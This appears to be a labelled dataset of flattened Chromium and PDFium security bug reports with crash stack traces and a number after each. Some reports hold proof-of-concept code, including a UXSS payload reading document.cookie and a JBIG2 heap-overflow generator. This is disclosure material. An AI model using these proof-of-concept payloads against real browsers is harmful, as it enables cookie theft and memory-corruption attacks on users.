third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:958 8 in startparse home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:900 9 in parsecontent home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:905 10 in fpdf_loadpage home/nils/build/targets/chrome/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:310 11 in renderpdf home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:412 12 in main home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:512 13 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 0 bytes to the right of 1960450-byte region allocated by thread t0 here 0 in interceptor_realloc asan_rtl discriminator 2 1 in cfx_binarybuf expandbuf int home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fxcrt/fx_basic_buffer.cpp:87 2 in appendbyte home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser include/fpdfapi fxcrt/fx_basic.h:61 3 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2115 4 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2191 5 in parseindirectobjectat home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1399 6 in parseindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1202 7 in getindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:1218 8 in getdirect home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:231 9 in start home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:958 10 in startparse home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:900 11 in parsecontent home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:905 12 in fpdf_loadpage home/nils/build/targets/chrome/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:310 13 in renderpdf home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:412 14 in main home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:512 15 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 by setting allocator_may_return_null=0 we can also confirm that the reallocation is failing asan_options=asan_alloc_limit_mb=256 allocator_may_return_null=0 pdfium_test test.pdf 2203==warning hit total allocation size limit of 256mb while trying to allocate 2450560 bytes 2203==addresssanitizer s allocator is terminating the process instead of returning 0 2203==if you do n't like this behavior set allocator_may_return_null=1 2203==addresssanitizer check failed home/nils/build/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_allocator.cc:146 0 0 0 in asancheckfailed asan_rtl 1 in sanitizer checkfailed char const int char const unsigned long long unsigned long long home/nils/build/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_common.cc:125 2 in sanitizer reportallocatorcannotreturnnull home/nils/build/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_allocator.cc:146 discriminator 2 3 in returnnullordie home/nils/build/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_allocator.h:1310 4 in reallocate asan_rtl 5 in interceptor_realloc asan_rtl 6 in cfx_binarybuf expandbuf int home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fxcrt/fx_basic_buffer.cpp:87 7 in appendbyte home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser include/fpdfapi fxcrt/fx_basic.h:61 8 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2115 9 in getobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2191 10 in parseindirectobjectat home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1399 11 in parseindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1202 12 in getindirectobject home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:1218 13 in getdirect home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:231 14 in start home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:958 15 in startparse home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:900 16 in parsecontent home/nils/build/targets/chrome/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_page/fpdf_page.cpp:905 17 in fpdf_loadpage home/nils/build/targets/chrome/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:310 18 in renderpdf home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:412 19 in main home/nils/build/targets/chrome/src/out/release third_party/pdfium/samples/pdfium_test.cc:512 20 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 21 in start	7
heap-use-after-free in content gpuchannelhost destroychannel vulnerability details render_thread_impl.cc/h contains the code which causes this use after free render_thread_impl.cc has these two variables 1 scoped_refptr webkit gpu contextproviderwebcontext shared_main_thread_contexts 2 scoped_refptr gpuchannelhost gpu_channel gpu_channel is passed as a parameter when shared_main_thread_contexts is created when gpu process is terminated render_thread_impl.cc creates a new gpu_channel but does not update the gpu_channel passed to shared_main_thread_contexts this behaviour causes use after free of message loop when current process is shut down version chrome version 41.0.2272.16 64-bit beta does not reproduce in official beta version 41.0.2272.16 but reproces in beta version 41.0.2272.16 64-bit built with address sanitizer beta version with address sanitizer is downloaded from operating system please indicate os version and service pack level 42.0.2285.0 64-bit trunk build os ubuntu linux 14.04 64 bit graphics card radeon hd 6370 reproduction case 1 start chrome built with address sanitizer on linux terminal 2 download and run testcase_gpu.html 3 wait about 30 seconds till page is redirected to google.com sometimes it may take more time 4 tab will not display sad tab but address sanitizer output will be displayed on terminal this test case tries to hang and terminate gpu process crashgpu method of testcase_gpu.html contains code which is used to hang gpu process it is possible that this code may not hang your gpu process depending on your graphics card and system configuration in that case please follow these steps 1 start chrome built with address sanitizer on linux terminal 2 download and run testcase_gpu.html 3 open chrome task manager and select gpu process 4 click end process button 5 page will redirect to google.com 6 address sanitizer output will be displayed on terminal for crashes please include the following additional information type of crash does not crash current tab uaf happens when previous process of current tab shuts down when new process for current tab is created when test case redirects page to google.com crash state address sanitizer output 5747==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in scoped_refptr base internal incomingtaskqueue operator const chrome/src/out/release base/memory/ref_counted.h:303:5 1 in base messageloop postnonnestabletask tracked_objects location const base callback void const chrome/src/out/release base/message_loop/message_loop.cc:289:3 2 in base messageloop deletesooninternal tracked_objects location const void void const void const chrome/src/out/release base/message_loop/message_loop.cc:631:3 3 in content gpuchannelhost destroychannel chrome/src/out/release content/common/gpu/client/gpu_channel_host.cc:238:5 4 in content gpuchannelhost gpuchannelhost chrome/src/out/release content/common/gpu/client/gpu_channel_host.cc:321:3 5 in content gpuchannelhost gpuchannelhost chrome/src/out/release content/common/gpu/client/gpu_channel_host.cc:320:35 6 in scoped_refptr content gpuchannelhost operator content gpuchannelhost chrome/src/out/release base/memory/ref_counted.h:313:7 7 in content webgraphicscontext3dcommandbufferimpl webgraphicscontext3dcommandbufferimpl chrome/src/out/release content/common/gpu/client/webgraphicscontext3d_command_buffer_impl.cc:119:3 8 in content webgraphicscontext3dcommandbufferimpl webgraphicscontext3dcommandbufferimpl chrome/src/out/release content/common/gpu/client/webgraphicscontext3d_command_buffer_impl.cc:114:46 9 in content contextprovidercommandbuffer contextprovidercommandbuffer chrome/src/out/release content/common/gpu/client/context_provider_command_buffer.cc:71:1 10 in content contextprovidercommandbuffer contextprovidercommandbuffer chrome/src/out/release content/common/gpu/client/context_provider_command_buffer.cc:59:63 11 in content renderthreadimpl renderthreadimpl chrome/src/out/release content/renderer/render_thread_impl.cc:665:1 12 in content renderthreadimpl renderthreadimpl chrome/src/out/release content/renderer/render_thread_impl.cc:658:39 13 in base internal scoped_ptr_impl content childthread base defaultdeleter content childthread reset content childthread chrome/src/out/release base/memory/scoped_ptr.h:247:7 14 in content childprocess childprocess chrome/src/out/release content/child/child_process.cc:68:5 15 in content renderermain content mainfunctionparams const chrome/src/out/release content/renderer/renderer_main.cc:231:3 16 in content runzygote content mainfunctionparams const content contentmaindelegate chrome/src/out/release content/app/content_main_runner.cc:347:14 17 in content contentmainrunnerimpl run chrome/src/out/release content/app/content_main_runner.cc:800:12 18 in content contentmain content contentmainparams const chrome/src/out/release content/app/content_main.cc:19:15 19 in chromemain chrome/src/out/release chrome/app/chrome_main.cc:66:12 20 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 is located 296 bytes inside of 320-byte region freed by thread t0 chrome here 0 in operator delete void 0:0 1 in base internal scoped_ptr_impl base messageloop base defaultdeleter base messageloop reset base messageloop chrome/src/out/release base/memory/scoped_ptr.h:247:7 2 in content renderthreadimpl shutdown chrome/src/out/release content/renderer/render_thread_impl.cc:761:3 3 in content childprocess childprocess chrome/src/out/release content/child/child_process.cc:67:5 4 in content renderermain content mainfunctionparams const chrome/src/out/release content/renderer/renderer_main.cc:231:3 5 in content runzygote content mainfunctionparams const content contentmaindelegate chrome/src/out/release content/app/content_main_runner.cc:347:14 6 in content contentmainrunnerimpl run chrome/src/out/release content/app/content_main_runner.cc:800:12 7 in content contentmain content contentmainparams const chrome/src/out/release content/app/content_main.cc:19:15 8 in chromemain chrome/src/out/release chrome/app/chrome_main.cc:66:12 9 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0 previously allocated by thread t0 chrome here 0 in operator new unsigned long 0:0 1 in content renderermain content mainfunctionparams const chrome/src/out/release content/renderer/renderer_main.cc:150:3 2 in content runzygote content mainfunctionparams const content contentmaindelegate chrome/src/out/release content/app/content_main_runner.cc:347:14 3 in content contentmainrunnerimpl run chrome/src/out/release content/app/content_main_runner.cc:800:12 4 in content contentmain content contentmainparams const chrome/src/out/release content/app/content_main.cc:19:15 5 in chromemain chrome/src/out/release chrome/app/chrome_main.cc:66:12 6 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287:0	11
chrome allows always open files of this type to be used with executables useragent mozilla/5.0 windows nt 6.3 wow64 applewebkit/537.36 khtml like gecko chrome/40.0.2214.115 safari/537.36 steps to reproduce the problem 1 download a legitimate executable program from a trustworthy site 2 click the dropdown menu next to the downloaded file at the bottom of your screen and select always open files of this type 3 visit a malicious site 4 you ve been pwned remote code execution and browser sandbox escape what is the expected behavior chrome should not allow always open files of this type to be used with file types where that option would allow sites to perform remote code execution attacks simply be initiating a download or at the very least it should warn uses of the potential negative consequences of selecting such an option what went wrong chrome will happily follow the user s instructions to execute any program that any random website tells it to download without prompting the user or even warning the user beforehand of the consequences of selecting the always open files of this type option for executable files did this work before n/a chrome version 40.0.2214.115 channel stable os version 8.1 flash version shockwave flash 16.0 r0 i realize this vulnerability requires the user to make a dumb mistake beforehand telling chrome to automatically run any executables it downloads so it is easy to write this off as pebcak and move on please do n't please consider that not all users are technically savvy enough to understand the security implications of selecting this option for executables and even those who are technically savvy might select the option accidentally or fail to take security into consideration when selecting the option initially once the option is selected i think it s very unlikely that the user will realize their mistake later until after it s too late	2
security uxss in authenticatorhelper vulnerability details sendmessagetopage in com.google.android.apps.chrome.tab.authenticatorhelper can execute user controlled javascript in the current tab from java world which may bypass sop check in the c world version chrome version chrome for android 40.0.2214.109 operating system android 4.4.2 reproduction case sendmessagetopage in com.google.android.apps.chrome.tab.authenticatorhelper will call evaluatejavascript to execute javascript in the current tab user controlled data is used to build the js statement single quote can be used to inject arbitrary js statement from first look this is not vulnerable but combined with several tricks it may leads to uxss poc1 sop bypass with frame confusion suppose parent.html in the victim domain iframed a html page child.html from evil domain parent.html body iframe src iframe body child.html body script parent.location intent 10010 intent scheme=tel action=com.google.android.apps.authenticator.authenticate end alert document.cookie script body when user visit the parent.html in chrome for android child.html can execute javascript in the parent domain by frame confusion thus bypass the sop poc2 uxss with boomerang javascript open the following uxss.html in chrome for android then press home button to return to the desktop wait for 10 seconds the chrome may popup automatically if not just open it and get uxssed if do n't press home button it also works but with a chance of failure uxss.html body link rel prerender href script settimeout function location googlechrome navigate url=intent 10010 intent scheme=tel action=com.google.android.apps.authenticator.authenticate end alert document.cookie settimeout function location 0 10000 script body	9
heap-use-after-free in content indexeddbbackingstore transaction chainedblobwriterimpl reportw detailed report fuzzer therealholden_worker job type windows_asan_chrome crash type heap-use-after-free read 4 crash address crash state content indexeddbbackingstore transaction chainedblobwriterimpl reportw base internal invoker indexsequence 0,1,2 base internal bindstate base base debug taskannotator runtask unminimized testcase additional requirements requires http filer inferno	11
security 1503a chrome ui axtree unserialize uaf 1503a chrome ui axtree unserialize uaf synopsis a use-after-free vulnerability can be triggered in chrome s accessibility features when they are enabled it does not look exploitable known affected software and attack vectors chrome 40.0 41.0 an attacker would need to get a target user to open a specially crafted webpage mitigations chrome 40.0 41.0 accessibility is disabled by default repro html head script window.onload function settimeout function document.getelementbyid style appendchild document.createelement x document.getelementbyid x appendchild document.createelement frame 0 script head body style id style import 404 body float left style x id x x x body html description to cause the use-after-free to trigger an access violation in a debugger it is required to run chrome with the force-renderer-accessibility and no-sandbox command line flags as well as set the environment variable chrome_allocator to winheap without these settings the repro should still trigger the use-after-free but no access violation as memory will still be allocated at the address of the freed memory windbg details of a crash a20.964 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=3db72f70 ebx=00000000 ecx=3db3efe8 edx=00000021 esi=216c6fb8 edi=6025af18 eip=5fb7f090 esp=0091ed84 ebp=0091edf4 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 chrome_5e750000 ui axtree unserialize 5fb7f090 ff701c push dword ptr eax+1ch ds:0023:3db72f8c 0:000 kp 100 childebp retaddr 0091edf4 5f5e6916 chrome_5e750000 ui axtree unserialize struct ui axtreeupdate update c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 107 0091eed0 5f5c7547 chrome_5e750000 content browseraccessibilitymanager onaccessibilityevents class std vector accessibilityhostmsg_eventparams std allocator accessibilityhostmsg_eventparams params c b\build\slave\win\build\src\content\browser\accessibility\browser_accessibility_manager.cc 189 0091efd8 5fa6c21c chrome_5e750000 content renderframehostimpl onaccessibilityevents class std vector accessibilityhostmsg_eventparams std allocator accessibilityhostmsg_eventparams params int reset_token value unavailable error c b\build\slave\win\build\src\content\browser\frame_host\render_frame_host_impl.cc 1234 0091efe8 5f5c5f95 chrome_5e750000 dispatchtomethodimpl externalprocessimporterclient void class externalprocessimporterclient obj function method struct tuple std vector importerurlrow std allocator importerurlrow int arg struct indexsequence 0,1 formal struct indexsequence 0,1 c b\build\slave\win\build\src\base\tuple.h 247 0091f008 5f5c5c53 chrome_5e750000 dispatchtomethod content renderframehostimpl void class content renderframehostimpl obj function method struct tuple std vector accessibilityhostmsg_eventparams std allocator accessibilityhostmsg_eventparams int arg c b\build\slave\win\build\src\base\tuple.h 253 0091f034 5eaadedc chrome_5e750000 accessibilityhostmsg_events dispatch content renderframehostimpl content renderframehostimpl void void class ipc message msg class content renderframehostimpl obj class content renderframehostimpl sender void parameter function func c b\build\slave\win\build\src\content\common\accessibility_messages.h 192 0091f238 5eaaa4ef chrome_5e750000 content renderframehostimpl onmessagereceived class ipc message msg c b\build\slave\win\build\src\content\browser\frame_host\render_frame_host_impl.cc 371 snip 0:000 heap p a eax address 3db72f70 found in dph_heap_root 951000 in free-ed allocation dph_heap_block virtaddr virtsize 3db21f70 3db72000 2000 71e69712 verifier avrfdebugpageheapfree 77ea1302 ntdll rtldebugfreeheap 77e60ce7 ntdll rtlpfreeheap 77df9428 ntdll rtlfreeheap 5e753069 chrome_5e750000 anonymous namespace win_heap_free c b\build\slave\win\build\src\base\allocator\allocator_shim_win.cc 62 5fb7f805 chrome_5e750000 ui axnode scalar deleting destructor 5ea81bef chrome_5e750000 v8 string externalstringresourcebase dispose c b\build\slave\win\build\src\v8\include\v8.h 2048 5fb7eec8 chrome_5e750000 ui axtree destroynodeandsubtree c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 212 5fb7eec8 chrome_5e750000 ui axtree destroynodeandsubtree c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 212 5fb7ef10 chrome_5e750000 ui axtree destroysubtree c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 207 5fb7f328 chrome_5e750000 ui axtree updatenode c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 198 5fb7f039 chrome_5e750000 ui axtree unserialize c b\build\slave\win\build\src\ui\accessibility\ax_tree.cc 99 5f5e6916 chrome_5e750000 content browseraccessibilitymanager onaccessibilityevents c b\build\slave\win\build\src\content\browser\accessibility\browser_accessibility_manager.cc 189 5f5c7547 chrome_5e750000 content renderframehostimpl onaccessibilityevents c b\build\slave\win\build\src\content\browser\frame_host\render_frame_host_impl.cc 1234 snip 0:000 dv t v esi esi class ui axtree this 0091edfc ebp struct ui axtreeupdate update 0091edb8 ebp struct ui axtreeupdatestate update_state struct ui axtreeupdatestate 0091edb4 ebp int old_root_id 0n1 0091edc8 ebp class ui axnode node 0091ede4 ebp class std vector ui axnode std allocator ui axnode children class std vector ui axnode std allocator ui axnode unavailable unavailable int i value unavailable 0091edd0 ebp unsigned int i 5 0091edd4 ebp class std tree_const_iterator std tree_val std tree_simple_types ui axnode iter class std tree_const_iterator std tree_val std tree_simple_types ui axnode unavailable unavailable class std vector ui axtreedelegate change std allocator ui axtreedelegate change changes value unavailable unavailable unavailable unsigned int i value unavailable unavailable unavailable class ui axnode node value unavailable relevant source code from chromium/src/ui/accessibility/ax_tree.cc sq=package chromium l=107 if update_state.pending_nodes.empty error nodes left pending by the update for std set axnode iterator iter update_state.pending_nodes.begin iter update_state.pending_nodes.end iter error base stringprintf d iter id return false where marks the crashing location from all this we can determine that the first ui axnode in update_state.pending_nodes points to freed memory the code also shows that the ui axtree unserialize function only allows an attacker to copy one dword at offset in the freed memory into a string using a printf which is not terribly exciting after this there does not appear to be a code path that results in use of the freed memory meaning this issue is probably not exploitable notes i allow vendors 60 days to fix an issue unless they can provide an adequate reason for extending this deadline failure to meet a deadline without an adequate explanation will normally result in public disclosure of information regarding the vulnerability to the general public credit if you can confirm this as a security issue and would like to provide credits for reporting the issue in your advisory please credit skylined	11
security url spoof with http authentication dialog and pdf prompt dialog vulnerability details this bug can display a prompt dialog box through a pdf file under a url of a different origin which displays an http authentication dialog box version chrome version 42.0.2311.135 stable 44.0.2384.0 trunk build operating system windows 8 ubuntu 14.04 reproduction case required software web server with support for php web server should serve content from 127.0.0.1 and 127.0.0.2 enable chrome pdf plugin if it is disabled 1 download urlspoof3.html auth.php formsubmit.pdf pdfform.php and userresponse.php 2 host downloaded files on local web server s root folder 3 open chrome 4 visit will load formsubmit.pdf 5 formsubmit.pdf will display a prompt dialog which will ask user s age 6 after 2 seconds page will be redirected to 7 but confirm dialog displayed from will remain authenitication dialog displayed from will be visible under confirm dialog 8 enter a number in prompt dialog and press ok 9 wait 5 seconds formsubmit.pdf will submit number typed by user to but this form submission will be not visible through browser ui this form submission request will be visible in web server s access log file 10 open a new tab and visit userresponse.php will display number typed by user formsubmit.pdf contains javascript code to display confirm message box and to submit form you can view this code by opening formsubmit.pdf in a pdf editor and viewing code for javascript openaction	11
security heap overflow vulnerability in jbig2 handling used by pdf reader vulnerability details an heap overflow can be triggered in the pdf reader process due to improper validation in the cjbig2_image expand function pdfium attempting to expand an image to a size which will overflow a 32bit integer 2^32 is not detected and can result to a cjbig2_image with a small buffer and an important height size 64-bits platforms are also affected because jbig2_realloc used a dword 32bit for the size to allocate later jbig2 image operation can then allow an attacker to alter memory after the allocated buffer due to these jbig2 image manipulation routines it is possible to modify memory at any given position and up to 4gb after the buffer modify memory at several distinct positions only modify part of a byte using available bitwise operators or and xor exploitation of this vulnerability to execute code in the context of the pdf reader process is highly probable the fix is to validate that stride height does not overflow 2^31 as it is already done in the cjbig2_image constructor a patch is included version chrome version all chrome versions with pdfium pdf reader included operating system tested on linux and windows both 32-bits and 64-bits platforms are affected reproduction case the jbig2-exploit.py poc script can be used to generate pdf files which replace 8 bytes of memory with a at various positions the jbig2-overflow-4.pdf has been generated by this script and modify the heap 4 bytes after the allocated buffer offset=6 on linux this alter glibc malloc structures jbig2-exploit.py jbig2-overflow-4.pdf 6 generating pdf jbig2-overflow-4.pdf initial image 32x4 stride=4 genericregion copy at line 1073741828 image will be reallocated with 20 bytes but size will be 32x1073741829 clear 8 bytes at offset 24 using nul image and or operation set 8 bytes to a at offset 24 using and operation jbig2 page 30 bytes jbig2 symbols 144 bytes generated pdf 1148 bytes pdfium_test jbig2-overflow-4.pdf rendering pdf file jbig2-overflow-4.pdf non-linearized path error in pdfium_test malloc memory corruption aborted core dumped gdb pdfium_test core gdb bt 0 in gi_raise sig=sig entry=6 at nptl/sysdeps/unix/sysv/linux/raise.c:56 1 in gi_abort at abort.c:89 2 in libc_message do_abort=1 fmt=fmt entry error in s s 0x s n at sysdeps/posix/libc_fatal.c:175 3 in malloc_printerr ptr str malloc memory corruption action optimized out at malloc.c:4996 4 int_malloc av=av entry main_arena bytes=bytes entry=72 at malloc.c:3447 5 in libc_calloc n optimized out elem_size optimized out at malloc.c:3219 6 in cpdf_jbig2interface jbig2_malloc this dwsize=72 at core/src/fxcodec/codec/codec_int.h:213 7 in cjbig2_object operator new size=72 pmodule at core/src/fxcodec/jbig2/jbig2_object.cpp:23 others errors can be generated using different offsets error in pdfium_test corrupted double-linked list aborted core dumped error in pdfium_test free corrupted unsorted chunks aborted core dumped error in pdfium_test free invalid next size fast aborted core dumped error in pdfium_test double free or corruption out aborted core dumped	7
unknown in skreader32 readstring detailed report uploader mbarbella google.com job type linux_asan_filter_fuzz_stub_32bit crash type unknown crash address crash state skreader32 readstring skpictureplayback handleop skpictureplayback draw regressed minimized testcase 1.12 kb filer mbarbella	11
security csp does not block svg image in nested iframe vulnerability details 1 go to and confirm image is blocked by csp 2 go to the image is loaded and you can see google logo due to this bug an attacker can bypass csp partially and load arbitrary image in target domain if attacker can include user s sensitive information as part of image request attacker can get that information without user interaction version 42.0.2311.135 m	2
heap-use-after-free in cjs_widestringarray cjs_widestringarray vulnerability details bug is caused by in document dofielddelay method of third_party\pdfium\fpdfsdk\src\javascript\document.cpp attached test case causes document dofielddelay method to call itself again so statement delete pdata in document dofielddelay is executed twice attached pdf files contain javascript code which causes this bug to view that code open any of attached pdf files in a pdf editor 1.then first part of javascript code below mentioned is availbe under document javascript option function startdelay f this.getfield txtname f.delay true f.value test setting value of text field triggers validate javascript code mentioned in step 2 which causes document dofielddelay method to re-enter f.delay false app.settimeout startdelay 3000 2 second part of javascript code below mentioned is availbe under validate option of txtname text field f1 this.getfield txtname f1.delay true f1.value test new f1.delay=false version chrome version 42.0.2311.152 stable 44.0.2401.0 trunk operating system ubuntu 14.04 64 bit windows 8.1 64 bit reproduction case 1 download poc_stable.pdf and poc_tot.pdf 2 open chrome 3 open poc_stable.pdf with chrome if you are running stable chrome version or open poc_tot.pdf with chrome if you are running latest chrome built using latest code in trunk poc_tot.pdf is slightly different from poc_stable.pdf because of a new bug in latest chrome code 4 wait 3 seconds 5 pdf process will crash if you are running an asan build asan output will be shown in terminal for crashes please include the following additional information type of crash pdf process crash state address sanitizer output 5275==error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 chrome 0 in cjs_widestringarray cjs_widestringarray third_party/pdfium/fpdfsdk/src/javascript include/javascript/field.h:60:2 1 in cjs_delaydata third_party/pdfium/fpdfsdk/src/javascript include/javascript/field.h:85:8 2 in document dofielddelay cfx_widestring const int third_party/pdfium/fpdfsdk/src/javascript/document.cpp:1938:0 3 in setdelay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1307:4 4 in delay third_party/pdfium/fpdfsdk/src/javascript/field.cpp:1320:0 5 in void jspropsetter field field delay char const char const v8 local v8 string v8 local v8 value v8 propertycallbackinfo void const third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_define.h:95:0 6 in v8 internal propertycallbackarguments call void v8 local v8 name v8 local v8 value v8 propertycallbackinfo void const v8 local v8 name v8 local v8 value v8/src/arguments.cc:89:1 7 in v8 internal object setpropertywithaccessor v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal handle v8 internal jsobject v8 internal handle v8 internal object v8 internal languagemode v8/src/objects.cc:377:5 8 in v8 internal object setpropertyinternal v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed bool v8/src/objects.cc:3201:16 9 in v8 internal object setproperty v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed v8/src/objects.cc:3247:7 10 in v8 internal storeic store v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal object storefromkeyed v8/src/ic/ic.cc:1632:3 11 in rt_impl_storeic_miss v8/src/ic/ic.cc:2470:3 12 in v8 internal storeic_miss int v8 internal object v8 internal isolate v8/src/ic/ic.cc:2461:0 9 unknown module 10 unknown module 11 unknown module 12 unknown module 13 unknown module 13 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:128:9 14 in v8 script run v8 local v8 context v8/src/api.cc:1656:23 15 in js_execute v8 isolate ifxjs_context wchar_t const long fxjserr third_party/pdfium/fpdfsdk/src/jsapi/fxjs_v8.cpp:353:33 16 in cjs_context dojob int cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:75:11 17 in cjs_context runscript cfx_widestring const cfx_widestring third_party/pdfium/fpdfsdk/src/javascript/js_context.cpp:114:9 18 in runjsscript third_party/pdfium/fpdfsdk/src/javascript/app.cpp:682:3 19 in app timerproc cjs_timer third_party/pdfium/fpdfsdk/src/javascript/app.cpp:664:0 20 in cjs_timer timerproc int third_party/pdfium/fpdfsdk/src/javascript include/javascript/js_object.h:268:30 21 in chrome_pdf pdfiumengine oncallback int pdf/pdfium/pdfium_engine.cc:2426:3 22 in operator ppapi/utility/completion_callback_factory.h:605:9 23 in pp completioncallbackfactory chrome_pdf outofprocessinstance pp threadsafethreadtraits callbackdata pp completioncallbackfactory chrome_pdf outofprocessinstance pp threadsafethreadtraits dispatcher0 void chrome_pdf outofprocessinstance int thunk void int ppapi/utility/completion_callback_factory.h:582:0 24 in pp_runcompletioncallback ppapi/c/pp_completion_callback.h:240:3 25 in callwhileunlocked void pp_completioncallback int pp_completioncallback int ppapi/shared_impl/proxy_lock.h:134:0 26 in ppapi proxy anonymous namespace callbackwrapper pp_completioncallback int ppapi/proxy/ppb_core_proxy.cc:50:0 27 in run base/bind_internal.h:157:12 28 in makeitso base/bind_internal.h:293:0 29 in base internal invoker indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void pp_completioncallback int void pp_completioncallback int base internal typelist pp_completioncallback int base internal typelist base internal unwraptraits pp_completioncallback base internal unwraptraits int base internal invokehelper false void base internal runnableadapter void pp_completioncallback int base internal typelist pp_completioncallback const int const void run base internal bindstatebase base/bind_internal.h:343:0 30 in run base/callback.h:396:12 31 in ppapi internal runwhilelockedhelper void callwhilelocked scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void ppapi/shared_impl/proxy_lock.h:198:0 32 in run base/bind_internal.h:157:12 33 in makeitso base/bind_internal.h:293:0 34 in base internal invoker indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist base internal passedwrapper scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal invokehelper false void base internal runnableadapter void scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void base internal typelist scoped_ptr ppapi internal runwhilelockedhelper void base defaultdeleter ppapi internal runwhilelockedhelper void void run base internal bindstatebase base/bind_internal.h:343:0 35 in run base/callback.h:396:12 36 in base debug taskannotator runtask char const char const base pendingtask const base/debug/task_annotator.cc:62:0 37 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:444:3 38 in deferorrunpendingtask base/message_loop/message_loop.cc:454:5 39 in base messageloop dodelayedwork base timeticks base/message_loop/message_loop.cc:604:0 40 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:36:17 41 in base runloop run base/run_loop.cc:55:3 42 in base messageloop run base/message_loop/message_loop.cc:303:3 43 in content 